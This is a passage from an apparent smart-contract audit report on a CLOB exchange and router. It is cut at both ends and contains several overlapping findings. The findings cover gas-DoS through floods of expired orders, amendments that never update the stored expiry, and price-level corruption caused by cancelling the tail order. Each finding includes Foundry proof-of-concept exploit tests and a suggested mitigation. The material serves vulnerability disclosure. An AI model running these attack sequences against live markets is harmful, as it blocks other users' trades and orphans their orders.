A cheap order flood can make buys or sells against a market practically unavailable through both direct CLOB calls and router CLOB_FILL routes. Victim fills revert or run out of gas before reaching live liquidity, while the attacker's locked tokens are refunded when cleanup eventually succeeds. This is a functional DoS of trading for the affected side/price range.

## Proof of Concept
1. Attacker deposits the base token and posts many minimum-size SELL orders at the current best ask, using cancel timestamps shortly in the future. Because the count is accumulated over many transactions, `maxLimitsPerTx` does not cap the total number of orders at that price.
2. Attacker waits until all of these orders expire.
3. A legitimate maker places live liquidity behind the expired queue at the same price, or existing live liquidity is already behind it.
4. A taker submits a BUY fill, directly or through `GTERouter.executeRoute()` with a CLOB_FILL hop.
5. `_matchIncomingBid` removes expired orders one-by-one before it can match the live order. At large enough queue length the taker transaction exceeds gas and reverts, leaving the expired queue in place for the next taker.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CLOBTestBase} from "test/clob/utils/CLOBTestBase.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {Side} from "contracts/clob/types/Order.sol";

contract ExpiredOrderFloodPoC is CLOBTestBase {
    function _postExpiredAskFlood(address maker, uint256 n, uint256 amount, uint256 price) internal {
        setupOrderExpiry = uint32(block.timestamp + 1);
        for (uint256 i; i < n; ++i) {
            setupOrder(Side.SELL, maker, amount, price);
        }
        setupOrderExpiry = NEVER;
    }

    function _fillBuy(address taker, uint256 amount, uint256 price) internal returns (uint256 gasUsed) {
        setupTokens(Side.BUY, taker, amount, price, true);
        ICLOB.PostFillOrderArgs memory fillArgs = ICLOB.PostFillOrderArgs({
            amount: amount,
            priceLimit: price,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.FILL_OR_KILL
        });

        uint256 gasBefore = gasleft();
        vm.prank(taker);
        clob.postFillOrder(taker, fillArgs);
        gasUsed = gasBefore - gasleft();
    }

    function testExpiredAskFloodMakesFillGasUnbounded() public {
        address taker = users[0];
        address attacker = users[1];
        address liveMaker = users[2];
        uint256 amount = 1 ether;

        uint256 priceOne = TICK_SIZE;
        _postExpiredAskFlood(attacker, 1, amount, priceOne);
        setupOrder(Side.SELL, liveMaker, amount, priceOne);
        vm.warp(block.timestamp + 2);
        uint256 gasOneExpired = _fillBuy(taker, amount, priceOne);
        assertEq(clob.getOrder(1).owner, address(0));

        uint256 priceMany = TICK_SIZE * 2;
        _postExpiredAskFlood(attacker, 100, amount, priceMany);
        setupOrder(Side.SELL, liveMaker, amount, priceMany);
        vm.warp(block.timestamp + 2);
        uint256 gasManyExpired = _fillBuy(taker, amount, priceMany);

        assertGt(gasManyExpired, gasOneExpired * 10);
        assertEq(clob.getOrder(102).owner, address(0));
    }
}

## Suggested Mitigation
Do not require taker fills to perform unbounded expired-order cleanup. Add a bounded `sweepExpiredOrders(side, price, maxOrders)` function, cap the number of expired orders removed per fill, and let fills stop or revert with a dedicated error after a bounded cleanup budget. Also add a per-price-level order count cap or charge a cleanup bond/fee so flooding one price level is economically bounded.
```

### M-15 / `LOsUmoQXuZsyjF_Gi48ug`
- Finding title: Same-price amendments do not update cancelTimestamp, causing amended orders to expire contrary to accepted args
- Report lines: 1627-1709
```md
## [M-15]. Same-price amendments do not update cancelTimestamp, causing amended orders to expire contrary to accepted args

## id: LOsUmoQXuZsyjF_Gi48ug

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
TimestampDependentLogic

## Location
CLOB.amend

## Finding Status: Valid
### Finding Status Justification: The same-price amend path is present and omits the timestamp update. _processAmend validates args.cancelTimestamp, then if side and price are unchanged calls _executeAmendAmount, which updates only amount and open interest. The emitted OrderAmended event includes args, but storage keeps the old cancelTimestamp. A later match uses OrderLib.isExpired on the stale timestamp and can remove the order as expired. This is a protocol-state inconsistency, not solely user error, and needs no privileged actor.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`_processAmend` validates `args.cancelTimestamp`, but when side and price are unchanged it calls `_executeAmendAmount`, which only updates `order.amount`. The order's stored cancelTimestamp remains the old value even though `OrderAmended` emits the new requested timestamp. Vulnerable snippet: `_executeAmendAmount(ds, order, args.amountInBase); ... order.amount = amount;` with no `order.cancelTimestamp = args.cancelTimestamp`. A maker can submit a valid amendment to extend or clear expiry, receive a successful transaction/event, but the resting order remains governed by the old expiry and can be removed as expired by the next matching order.

## Impact
Valid maker orders can be unexpectedly expired and removed, causing loss of expected execution opportunity and incorrect offchain state for systems relying on the successful amend event. This impacts market availability/fairness rather than directly stealing assets.

## Proof of Concept
1. Maker posts a live order with a near cancelTimestamp. 2. Before expiry, maker amends only the amount while setting cancelTimestamp to zero or a later timestamp. 3. The amend succeeds and emits the requested timestamp. 4. After the original timestamp passes, a taker crosses the order. 5. Matching uses the stale stored timestamp, treats the order as expired, removes it, and refunds instead of filling the maker's amended live order.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB, Side} from "contracts/clob/ICLOB.sol";
import {MarketConfig, MarketSettings} from "contracts/clob/types/Book.sol";
import {OrderIdLib} from "contracts/clob/types/Order.sol";

contract MockAccountManager2 {
    mapping(address => mapping(address => uint256)) public bal;
    function getOperatorRoleApprovals(address, address) external pure returns (uint256) { return 0; }
    function creditAccount(address a, address t, uint256 x) external { bal[a][t] += x; }
    function creditAccountNoEvent(address a, address t, uint256 x) external { bal[a][t] += x; }
    function debitAccount(address a, address t, uint256 x) external { require(bal[a][t] >= x, "bal"); bal[a][t] -= x; }
    function settleIncomingOrder(ICLOB.SettleParams calldata p) external returns (uint256) {
        if (p.side == Side.BUY) { require(bal[p.taker][p.quoteToken] >= p.takerQuoteAmount, "quote"); bal[p.taker][p.quoteToken] -= p.takerQuoteAmount; bal[p.taker][p.baseToken] += p.takerBaseAmount; }
        else { require(bal[p.taker][p.baseToken] >= p.takerBaseAmount, "base"); bal[p.taker][p.baseToken] -= p.takerBaseAmount; bal[p.taker][p.quoteToken] += p.takerQuoteAmount; }
        for (uint256 i; i < p.makerCredits.length; ++i) { bal[p.makerCredits[i].maker][p.quoteToken] += p.makerCredits[i].quoteAmount; bal[p.makerCredits[i].maker][p.baseToken] += p.makerCredits[i].baseAmount; }
        return 0;
    }
}

contract MockFactory2 { function getMaxLimitExempt(address) external pure returns (bool) { return false; } }

contract CLOBAmendExpiryPoC is Test {
    using OrderIdLib for address;
    CLOB clob; MockAccountManager2 am; address factory = address(new MockFactory2());
    address base = address(0xBEEF); address quote = address(0xCAFE); address maker = address(0xA1); address taker = address(0xB2);

    function setUp() public {
        am = new MockAccountManager2();
        clob = new CLOB(factory, address(0x999), address(am), 100);
        clob.initialize(MarketConfig({quoteToken: quote, baseToken: base, quoteSize: 1, baseSize: 1}), MarketSettings({status: true, maxLimitsPerTx: 10, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1}), address(this));
        am.creditAccount(maker, base, 1_000); am.creditAccount(taker, quote, 10_000);
    }

    function testSamePriceAmendDoesNotExtendExpiry() public {
        uint32 oldExpiry = uint32(block.timestamp + 10);
        vm.prank(maker); clob.postLimitOrder(maker, ICLOB.PostLimitOrderArgs({amountInBase: 200, price: 2, cancelTimestamp: oldExpiry, side: Side.SELL, clientOrderId: 7, limitOrderType: ICLOB.LimitOrderType.POST_ONLY}));
        uint256 id = maker.getOrderId(7);
        vm.prank(maker); clob.amend(maker, ICLOB.AmendArgs({orderId: id, amountInBase: 300, price: 2, cancelTimestamp: 0, side: Side.SELL, limitOrderType: ICLOB.LimitOrderType.POST_ONLY}));
        assertEq(clob.getOrder(id).cancelTimestamp, oldExpiry, "timestamp was not updated to no-expiry sentinel");
        vm.warp(oldExpiry + 1);
        uint256 takerBaseBefore = am.bal(taker, base);
        vm.prank(taker); clob.postFillOrder(taker, ICLOB.PostFillOrderArgs({amount: 100, priceLimit: 2, side: Side.BUY, amountIsBase: true, fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL}));
        assertEq(am.bal(taker, base), takerBaseBefore, "amended order expired instead of filling");
    }
}

## Suggested Mitigation
In the same-side same-price amendment path, update `order.cancelTimestamp = uint32(args.cancelTimestamp)` alongside `order.amount`. Add tests for extending expiry and changing expiry to the zero no-expiry sentinel.
```

### M-17 / `UeiY1mitQGuD0qzyGErYn`
- Finding title: Tail-order cancellation corrupts CLOB price-level links and can brick matching at that price
- Report lines: 1803-1882
```md
## [M-17]. Tail-order cancellation corrupts CLOB price-level links and can brick matching at that price

## id: UeiY1mitQGuD0qzyGErYn

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
BookLib.addOrderToBook/_updateLimitPostOrder

## Finding Status: Valid
### Finding Status Justification: The root cause exists in BookLib.addOrderToBook: storage is written before the appended order's prevOrderId is populated. Removal of any stored non-head order with prevOrderId == 0 can corrupt the limit pointers. For a tail cancellation, _updateLimitRemoveOrder sets headOrder to zero and tailOrder to zero while leaving the price indexed and numOrders positive. The matching loops then load orders[limit.headOrder], i.e. orders[0], and stop with baseDelta == 0. This is an in-scope production path and does not require privileged action or victim misuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When a second order is appended to an existing price level, `_updateBookPostOrder` stores `self.orders[order.id] = order` before `_updateLimitPostOrder` sets `order.prevOrderId = tailOrder.id`. The updated `prevOrderId` is only written to the memory copy, not to storage. Vulnerable snippet: `self.orders[order.id] = order; ... Order storage tailOrder = self.orders[limit.tailOrder]; tailOrder.nextOrderId = order.id; order.prevOrderId = tailOrder.id; limit.tailOrder = order.id;`. Any non-head order therefore has `prevOrderId == 0` in storage. If that tail/middle order is cancelled, amended to a new price/side, or evicted as non-competitive, `_updateLimitRemoveOrder` treats it as the head and sets `limit.headOrder = next`, orphaning earlier orders while the price remains in the tree. Matching then reads `orders[0]` at the best price, gets a zero-size order, and reverts with `ZeroCostTrade`.

## Impact
A permissionless maker can orphan another maker's resting order at the same price. The victim's funds are not stolen, but their order becomes unfillable and the best price can be bricked until the victim manually cancels or another order repairs the head pointer.

## Proof of Concept
1. Victim posts an ask at price P. 2. Attacker posts a second ask at the same price P, becoming the tail. 3. Because the tail's `prevOrderId` was never stored, attacker cancels their own tail order and CLOB sets the limit head to zero. 4. Victim's order still exists and open interest remains, but the price level head is null. 5. A taker attempting to buy at P reverts with `ZeroCostTrade` instead of filling the victim.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CLOBTestBase} from "test/clob/utils/CLOBTestBase.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {Side, OrderIdLib} from "contracts/clob/types/Order.sol";
import {Limit} from "contracts/clob/types/Book.sol";

contract TailCancelCorruptionPoC is CLOBTestBase {
    using OrderIdLib for *;

    function test_TailCancelOrphansHeadAndBricksFill() public {
        address victim = users[0];
        address attacker = users[1];
        address taker = users[2];
        uint256 price = 1 ether;
        uint256 amount = 1 ether;

        setupOrder(Side.SELL, victim, amount, price);
        setupOrder(Side.SELL, attacker, amount, price);

        uint256[] memory ids = new uint256[](1);
        ids[0] = 2;
        vm.prank(attacker);
        clob.cancel(attacker, ICLOB.CancelArgs({orderIds: ids}));

        Limit memory limit = clob.getLimit(price, Side.SELL);
        assertEq(limit.numOrders, 1, "one order is still counted at the price");
        assertEq(limit.headOrder.unwrap(), 0, "head pointer was corrupted to null");
        assertEq(clob.getOrder(1).owner, victim, "victim order still exists but is orphaned");

        setupTokens(Side.BUY, taker, amount, price, true);
        ICLOB.PostFillOrderArgs memory fill = ICLOB.PostFillOrderArgs({
            amount: amount,
            priceLimit: price,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
        });

        vm.prank(taker);
        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        clob.postFillOrder(taker, fill);
    }
}

## Suggested Mitigation
Store the order only after both links are populated, or explicitly write the stored order's `prevOrderId` after appending: `self.orders[order.id].prevOrderId = tailOrder.id`. Add invariant tests for cancelling head, middle, and tail orders at the same price.
```

### H-18 / `6Uh2u3bVS4waCHjG-fjsj`
- Finding title: Canceling a tail order at a shared price corrupts the CLOB price level and blocks matching
- Report lines: 1883-1970
```md
## [H-18]. Canceling a tail order at a shared price corrupts the CLOB price level and blocks matching

## id: 6Uh2u3bVS4waCHjG-fjsj

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
CLOB / BookLib.postLimitOrder / cancel

## Finding Status: Valid
### Finding Status Justification: The same-price tail corruption is mechanically proven by BookLib. _updateBookPostOrder persists the order before _updateLimitPostOrder sets the memory prevOrderId. Cancelling the appended order then enters _updateLimitRemoveOrder with prevOrderId zero and nextOrderId zero, leaving a nonempty limit with zero head/tail and a live tree price. Matching at that price loads a null order and cannot fill. The path is in-scope, permissionless, and not guarded by access control or list validation.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When a second order is appended at an existing price, BookLib stores the order before assigning its prevOrderId. The stored tail therefore has prevOrderId == 0. Vulnerable snippet: `self.orders[order.id] = order;` in `_updateBookPostOrder`, followed later by `order.prevOrderId = tailOrder.id;` only in memory inside `_updateLimitPostOrder`. If that tail is canceled, `_updateLimitRemoveOrder` treats it as the head and sets both `limit.headOrder` and `limit.tailOrder` to zero while leaving the price in the tree with `numOrders == 1`. Future matching reads `orders[0]` at the best price, gets `baseDelta == 0`, and breaks without matching valid liquidity behind the corrupted price level.

## Impact
A permissionless maker can corrupt a populated price level. The best bid/ask tree can become pinned to an unmatchable empty head, causing taker orders crossing that price to fail to execute and leaving earlier maker liquidity orphaned from normal matching/cancel traversal.

## Proof of Concept
1. Maker A posts an ask at price P. 2. Maker B posts another ask at the same price P, becoming the tail, but its stored prevOrderId remains zero. 3. Maker B cancels its tail order. 4. The limit still has numOrders == 1 and price P remains in the ask tree, but headOrder and tailOrder are zero. 5. A buyer submits a crossing order; matching loads orders[0], produces zero baseDelta, and breaks, so the book is functionally blocked at price P.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB, Side} from "contracts/clob/ICLOB.sol";
import {MarketConfig, MarketSettings, Limit} from "contracts/clob/types/Book.sol";
import {OrderIdLib} from "contracts/clob/types/Order.sol";

contract MockAccountManager {
    mapping(address => mapping(address => uint256)) public bal;
    function getOperatorRoleApprovals(address, address) external pure returns (uint256) { return 0; }
    function creditAccount(address a, address t, uint256 x) external { bal[a][t] += x; }
    function creditAccountNoEvent(address a, address t, uint256 x) external { bal[a][t] += x; }
    function debitAccount(address a, address t, uint256 x) external { require(bal[a][t] >= x, "bal"); bal[a][t] -= x; }
    function settleIncomingOrder(ICLOB.SettleParams calldata p) external returns (uint256) {
        if (p.side == Side.BUY) { require(bal[p.taker][p.quoteToken] >= p.takerQuoteAmount, "quote"); bal[p.taker][p.quoteToken] -= p.takerQuoteAmount; bal[p.taker][p.baseToken] += p.takerBaseAmount; }
        else { require(bal[p.taker][p.baseToken] >= p.takerBaseAmount, "base"); bal[p.taker][p.baseToken] -= p.takerBaseAmount; bal[p.taker][p.quoteToken] += p.takerQuoteAmount; }
        for (uint256 i; i < p.makerCredits.length; ++i) { bal[p.makerCredits[i].maker][p.quoteToken] += p.makerCredits[i].quoteAmount; bal[p.makerCredits[i].maker][p.baseToken] += p.makerCredits[i].baseAmount; }
        return 0;
    }
}

contract MockFactory { function getMaxLimitExempt(address) external pure returns (bool) { return false; } }

contract CLOBLinkedListCorruptionPoC is Test {
    using OrderIdLib for address;
    CLOB clob; MockAccountManager am; address factory = address(new MockFactory());
    address base = address(0xBEEF); address quote = address(0xCAFE); address a = address(0xA1); address b = address(0xB2); address taker = address(0xC3);

    function setUp() public {
        am = new MockAccountManager();
        clob = new CLOB(factory, address(0x999), address(am), 100);
        clob.initialize(MarketConfig({quoteToken: quote, baseToken: base, quoteSize: 1, baseSize: 1}), MarketSettings({status: true, maxLimitsPerTx: 10, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1}), address(this));
        am.creditAccount(a, base, 1_000); am.creditAccount(b, base, 1_000); am.creditAccount(taker, quote, 10_000);
    }

    function testCancelTailCorruptsBestAskAndBlocksMatching() public {
        ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs({amountInBase: 100, price: 2, cancelTimestamp: 0, side: Side.SELL, clientOrderId: 1, limitOrderType: ICLOB.LimitOrderType.POST_ONLY});
        vm.prank(a); clob.postLimitOrder(a, ask);
        ask.clientOrderId = 2;
        vm.prank(b); clob.postLimitOrder(b, ask);
        uint256 tailId = b.getOrderId(2);
        uint256[] memory ids = new uint256[](1); ids[0] = tailId;
        vm.prank(b); clob.cancel(b, ICLOB.CancelArgs({orderIds: ids}));
        Limit memory lim = clob.getLimit(2, Side.SELL);
        assertEq(lim.numOrders, 1);
        assertEq(lim.headOrder.unwrap(), 0);
        assertEq(lim.tailOrder.unwrap(), 0);
        uint256 takerBaseBefore = am.bal(taker, base);
        vm.prank(taker); clob.postFillOrder(taker, ICLOB.PostFillOrderArgs({amount: 100, priceLimit: 2, side: Side.BUY, amountIsBase: true, fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL}));
        assertEq(am.bal(taker, base), takerBaseBefore, "crossing fill was blocked by corrupted best ask");
    }
}

## Suggested Mitigation
Store the final linked-list fields in storage after assigning prevOrderId, or assign prevOrderId before `self.orders[order.id] = order`. Add invariant tests for head/tail/middle removal at multi-order price levels.
```

### M-19 / `m2sqyBVvdOeZDLv7wxPl1`
- Finding title: Unbounded expired-order cleanup lets makers gas-DoS fills at the best price
- Report lines: 1971-2047
```md
## [M-19]. Unbounded expired-order cleanup lets makers gas-DoS fills at the best price

## id: m2sqyBVvdOeZDLv7wxPl1

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
CLOB._matchIncomingBid,_matchIncomingAsk,postFillOrder,postLimitOrder

## Finding Status: Valid
### Finding Status Justification: The bid and ask matching loops synchronously remove expired head orders with no max removals parameter and no standalone bounded pruning path. maxNumLimitsPerSide only caps price levels, and maxLimitsPerTx only throttles per-transaction placements; neither bounds total same-price orders accumulated across transactions. An attacker can place many expiring orders at one price ahead of live liquidity, causing every crossing taker path through postFillOrder or marketable postLimitOrder to perform unbounded cleanup before settlement. This is in-scope, permissionless, and not fully mitigated.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Matching performs unbounded cleanup of expired resting orders before reaching live liquidity. Vulnerable snippets: `_matchIncomingBid` loops while `bestAskPrice <= incomingOrder.price`, and for every expired head order it calls `_removeExpiredAsk(ds, bestAskOrder); bestAskPrice = ds.getBestAskPrice(); continue;`. `_matchIncomingAsk` has the symmetric bid path. There is no per-call cleanup bound or pagination, and the number of orders at one price level is not bounded by maxNumLimitsPerSide, which only limits unique price levels. An attacker can fill the best price level with many minimum-size soon-expiring orders ahead of honest liquidity, forcing every crossing taker to pay cleanup gas before any fill can occur.

## Impact
Once the expired prefix is large enough, crossing fills or marketable limit orders exceed practical gas limits and revert, leaving the expired orders in place and blocking access to live liquidity behind them. The attacker recovers the locked order value once cleanup eventually happens or can cancel, so the grief cost is mainly order-placement gas and temporary minimum-size collateral.

## Proof of Concept
1. Attacker posts many minimum-size SELL orders at the best ask with near-term expiries. 2. An honest maker posts live liquidity at the same price behind the attacker orders. 3. After expiry, takers must remove every expired attacker order in `_matchIncomingBid` before reaching the live order. 4. With enough expired orders, the crossing fill runs out of gas/reverts, so no expired orders are removed and the best ask remains blocked. 5. The same attack applies to BUY orders through `_matchIncomingAsk`.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CLOBTestBase} from "test/clob/utils/CLOBTestBase.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {Side} from "contracts/clob/types/Order.sol";

contract CLOBExpiredOrderGasDoSPoC is CLOBTestBase {
    function test_manyExpiredBestAskOrdersBlockFillUnderGasLimit() public {
        address attacker = users[0];
        address honestMaker = users[1];
        address taker = users[2];
        uint256 price = TICK_SIZE;
        uint256 dust = MIN_LIMIT_ORDER_AMOUNT_IN_BASE;
        uint256 expiredOrders = 600;

        setupOrderExpiry = uint32(block.timestamp + 1);
        for (uint256 i; i < expiredOrders; ++i) {
            setupOrder(Side.SELL, attacker, dust, price);
        }

        setupOrderExpiry = NEVER;
        setupOrder(Side.SELL, honestMaker, 1 ether, price);
        vm.warp(block.timestamp + 2);

        setupTokens(Side.BUY, taker, 1 ether, price, true);
        ICLOB.PostFillOrderArgs memory fillArgs = ICLOB.PostFillOrderArgs({
            amount: 1 ether,
            priceLimit: price,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
        });

        bytes memory data = abi.encodeCall(clob.postFillOrder, (taker, fillArgs));
        vm.prank(taker);
        (bool ok,) = address(clob).call{gas: 1_500_000}(data);

        assertEq(ok, false);
        assertEq(clob.getOrder(1).owner, attacker);
        assertEq(clob.getOrder(expiredOrders + 1).owner, honestMaker);
    }
}

## Suggested Mitigation
Bound expired-order cleanup per transaction and expose a paginated permissionless cleanup function. Do not require taker fills to clear an unbounded expired prefix before matching; alternatively cap orders per price level, charge a cleanup bond/fee to expiring makers, or allow fills to skip expired orders with bounded work.
```

### M-20 / `NipRYiPzXhZll_OuCOzOd`
- Finding title: Expired CLOB orders can gas-brick GTERouter CLOB fills by forcing unbounded cleanup before live liquidity
- Report lines: 2048-2208
```md
## [M-20]. Expired CLOB orders can gas-brick GTERouter CLOB fills by forcing unbounded cleanup before live liquidity

## id: NipRYiPzXhZll_OuCOzOd

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
CLOB reachable through GTERouter.postFillOrder / executeRoute

## Finding Status: Valid
### Finding Status Justification: The router and CLOB paths are in scope. GTERouter._executeClobPostFillOrder sets an extreme priceLimit and calls CLOB.postFillOrder as a FILL_OR_KILL fill. The CLOB matching loops remove expired top-of-book orders one at a time before matching live liquidity, with no bounded cleanup parameter used by the router. Since order count at one price can accumulate across transactions, a permissionless maker can create an expired queue that makes each router fill consume unbounded gas before progress. Existing min order and per-transaction limit controls do not fully block this path.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
GTERouter CLOB route hops call CLOB.postFillOrder with an extreme price limit, so every router fill must traverse the current top of book. The CLOB matching loops remove expired resting orders inline before reaching live liquidity, with no per-call bound, pagination, or separate cleanup path. A user can place many minimum-size orders at the best price, let them expire, and leave them in front of honest liquidity. Any later router CLOB_FILL or direct fill that crosses that price must remove all expired orders in the same transaction before it can trade; if the expired queue exceeds the available gas, the transaction reverts and all removals are rolled back, leaving the market stuck. Vulnerable snippets: `GTERouter._executeClobPostFillOrder` sets `fillArgs.priceLimit = fillArgs.side == Side.BUY ? type(uint256).max : 0;` and calls `ICLOB(market).postFillOrder(msg.sender, fillArgs)`. In `CLOB._matchIncomingBid`: `while (bestAskPrice <= incomingOrder.price && incomingOrder.amount > 0) { ... if (bestAskOrder.isExpired()) { _removeExpiredAsk(ds, bestAskOrder); bestAskPrice = ds.getBestAskPrice(); continue; } ... }`. The sell side has the same unbounded expired-order cleanup in `_matchIncomingAsk`.

## Impact
A permissionless order flooder can make CLOB fills through GTERouter and direct fills against an affected side of the book exceed the block gas limit, blocking trading through that market until the attacker cooperates or a cleanup transaction within gas limits is possible. User funds are not stolen, but market availability and router execution are materially impacted.

## Proof of Concept
1. Attacker posts many valid minimum-size sell orders at the best ask, using repeated transactions to bypass the per-transaction limit.
2. The attacker sets near-term cancelTimestamp values and waits until all orders expire.
3. Honest makers place live sell liquidity at a worse ask price behind the expired price level.
4. A victim calls GTERouter.executeRoute with a CLOB_FILL buy hop, or calls CLOB.postFillOrder directly with a buy price limit that reaches the honest liquidity.
5. Matching must first remove every expired ask at the better price. When the expired queue is large enough, cleanup exceeds the gas limit and reverts, restoring the expired orders.
6. The victim cannot reach the honest liquidity through the router because each attempt repeats the same unbounded cleanup.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {BeaconProxy} from "@openzeppelin/proxy/beacon/BeaconProxy.sol";
import {UpgradeableBeacon} from "@openzeppelin/proxy/beacon/UpgradeableBeacon.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {ICLOBManager, SettingsParams} from "contracts/clob/ICLOBManager.sol";
import {IAccountManager} from "contracts/account-manager/IAccountManager.sol";
import {MarketConfig, MarketSettings} from "contracts/clob/types/Book.sol";
import {Side} from "contracts/clob/types/Order.sol";
import {FeeTiers} from "contracts/clob/types/FeeData.sol";
import {OperatorRoles} from "contracts/utils/Operator.sol";

contract MockAccountManager is IAccountManager {
    function getOperatorRoleApprovals(address, address) external pure returns (uint256) { return 0; }
    function getAccountBalance(address, address) external pure returns (uint256) { return 0; }
    function getEventNonce() external pure returns (uint256) { return 0; }
    function getTotalFees(address) external pure returns (uint256) { return 0; }
    function getUnclaimedFees(address) external pure returns (uint256) { return 0; }
    function getFeeTier(address) external pure returns (FeeTiers) { return FeeTiers.ZERO; }
    function getSpotTakerFeeRateForTier(FeeTiers) external pure returns (uint256) { return 0; }
    function getSpotMakerFeeRateForTier(FeeTiers) external pure returns (uint256) { return 0; }
    function deposit(address, address, uint256) external {}
    function withdraw(address, address, uint256) external {}
    function depositFromRouter(address, address, uint256) external {}
    function withdrawToRouter(address, address, uint256) external {}
    function registerMarket(address) external {}
    function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns (uint256) { return 0; }
    function collectFees(address, address) external pure returns (uint256) { return 0; }
    function setSpotAccountFeeTier(address, FeeTiers) external {}
    function setSpotAccountFeeTiers(address[] calldata, FeeTiers[] calldata) external {}
    function creditAccount(address, address, uint256) external {}
    function creditAccountNoEvent(address, address, uint256) external {}
    function debitAccount(address, address, uint256) external {}
}

contract MockFactory is ICLOBManager {
    function beacon() external pure returns (address) { return address(0); }
    function getMarketAddress(address, address) external pure returns (address) { return address(0); }
    function isMarket(address) external pure returns (bool) { return false; }
    function createMarket(address, address, SettingsParams calldata) external pure returns (address) { return address(0); }
    function setMaxLimitsPerTx(ICLOB[] calldata, uint8[] calldata) external {}
    function setTickSizes(ICLOB[] calldata, uint256[] calldata) external {}
    function setMinLimitOrderAmounts(ICLOB[] calldata, uint256[] calldata) external {}
    function getMaxLimitExempt(address) external pure returns (bool) { return false; }
    function setAccountFeeTiers(address[] calldata, FeeTiers[] calldata) external {}
    function setMaxLimitsExempt(address[] calldata, bool[] calldata) external {}
}

contract FillExecutor {
    function fill(ICLOB clob, ICLOB.PostFillOrderArgs calldata args) external {
        clob.postFillOrder(address(this), args);
    }
}

contract ExpiredOrderGasBrickTest is Test {
    uint256 constant EXPIRED_ORDERS = 80;

    function testExpiredOrdersRemainAndBrickBoundedGasFill() external {
        MockFactory factory = new MockFactory();
        MockAccountManager accountManager = new MockAccountManager();

        CLOB impl = new CLOB(address(factory), address(0xBEEF), address(accountManager), 10);
        UpgradeableBeacon beacon = new UpgradeableBeacon(address(impl), address(this));

        bytes memory initData = abi.encodeCall(
            CLOB.initialize,
            (
                MarketConfig({quoteToken: address(0x1001), baseToken: address(0x1002), quoteSize: 1e18, baseSize: 1e18}),
                MarketSettings({status: true, maxLimitsPerTx: 255, minLimitOrderAmountInBase: 1, tickSize: 1, lotSizeInBase: 1}),
                address(this)
            )
        );
        CLOB clob = CLOB(address(new BeaconProxy(address(beacon), initData)));

        uint32 expiry = uint32(block.timestamp + 1);
        for (uint256 i; i < EXPIRED_ORDERS; ++i) {
            clob.postLimitOrder(
                address(this),
                ICLOB.PostLimitOrderArgs({
                    amountInBase: 1,
                    price: 1,
                    cancelTimestamp: expiry,
                    side: Side.SELL,
                    clientOrderId: uint96(i + 1),
                    limitOrderType: ICLOB.LimitOrderType.POST_ONLY
                })
            );
        }

        vm.warp(block.timestamp + 2);

        clob.postLimitOrder(
            address(this),
            ICLOB.PostLimitOrderArgs({
                amountInBase: 1,
                price: 2,
                cancelTimestamp: 0,
                side: Side.SELL,
                clientOrderId: 10_000,
                limitOrderType: ICLOB.LimitOrderType.POST_ONLY
            })
        );

        FillExecutor executor = new FillExecutor();
        ICLOB.PostFillOrderArgs memory fillArgs = ICLOB.PostFillOrderArgs({
            amount: 1,
            priceLimit: 2,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
        });

        (bool ok,) = address(executor).call{gas: 250_000}(abi.encodeCall(FillExecutor.fill, (ICLOB(address(clob)), fillArgs)));

        assertEq(ok, false, "bounded-gas fill reverts before reaching live liquidity");
        assertEq(clob.getNumAsks(), EXPIRED_ORDERS + 1, "expired removals rolled back, so every retry pays again");
    }
}


## Suggested Mitigation
Do not perform unbounded expired-order cleanup inside the hot matching path. Add a bounded, permissionless cleanup function with pagination and optional keeper incentive; cap the number of orders per price level; and make matching process at most a caller-specified maximum number of expired orders before returning or reverting with a deterministic partial-progress error. Router CLOB hops should also allow bounded cleanup parameters instead of always crossing the whole expired queue.
```

### M-21 / `AB3Otlvf037zOTvgUcwhh`
- Finding title: Same-price order cancellation corrupts BookLib limits and blocks matching at the best price
- Report lines: 2209-2287
```md
## [M-21]. Same-price order cancellation corrupts BookLib limits and blocks matching at the best price

## id: AB3Otlvf037zOTvgUcwhh

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
Dos

## Location
